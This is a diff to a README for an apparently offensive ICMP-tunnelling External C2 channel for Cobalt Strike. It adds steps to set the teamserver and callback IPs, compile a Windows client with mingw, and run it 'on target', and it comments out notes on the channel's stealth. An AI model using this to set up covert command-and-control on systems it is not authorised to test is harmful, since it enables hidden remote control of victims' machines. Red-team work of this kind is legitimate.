@@ -27,8 +27,28 @@ pip install -r Controller/Python/requirements.txt
 
 2. Start an External C2 beacon in CS
 
+3. Edit the following fields in these files:
 
-3. run `python3 Controller/Python/controller.py`
+`controller.py`:
+```
+TEAMSERVER_IP = "10.10.10.21" # change to Teamserver IP (127.0.0.1 works if running on same box)
+TEAMSERVER_PORT = 2222        # Change to Teamserver Port
+```
+
+`client_x86.c`:
+```
+#define ICMP_CALLBACK_SERVER "172.19.241.197" //change to controller IP
+```
+
+There are other fields you can edit in both `controller.py` and `client_x86.c`,
+see each file for those settigns
+
+4. Compile the Client `i686-w64-mingw32-gcc client_x86.c -o client_x86.exe -lws2_32`
+> 64 bit mingw may work as well, I have not tested this yet.
+
+5. run `python3 Controller/Python/controller.py`
+
+5. Run the compiled `client_x86.exe` on target.
 
 ---
 ## Overall Flow
@@ -126,9 +146,9 @@ pip install -r Controller/Python/requirements.txt
      └─ Payload (<=500 bytes): [“RQ47”][TeamServer response data]
   ```
 
----
 
-## Advantages & Caveats
+
+<!-- ## Advantages & Caveats
 
 - **Quietness**: Leverages legitimate ICMP traffic.  
 - **Minimal Dependencies**: Only raw sockets and basic ICMP parsing.  
@@ -143,4 +163,4 @@ pip install -r Controller/Python/requirements.txt
 2. **Controller setup**: Needs elevated privileges to sniff and send raw ICMP.  
 3. **Tag matching**: Both sides ignore any ICMP not starting with `RQ47`, preventing OS replies from disrupting reassembly.  
 4. **Timeouts**: The client’s recv loop should have a timeout (e.g. 5 seconds) to abort if fragments never arrive.  
-5. **TeamServer traffic**: After the initial C2 payload, any “seq > 0” Echo Requests are forwarded to the TeamServer over plain TCP; replies come back in a single ICMP Echo 
+5. **TeamServer traffic**: After the initial C2 payload, any “seq > 0” Echo Requests are forwarded to the TeamServer over plain TCP; replies come back in a single ICMP Echo  -->
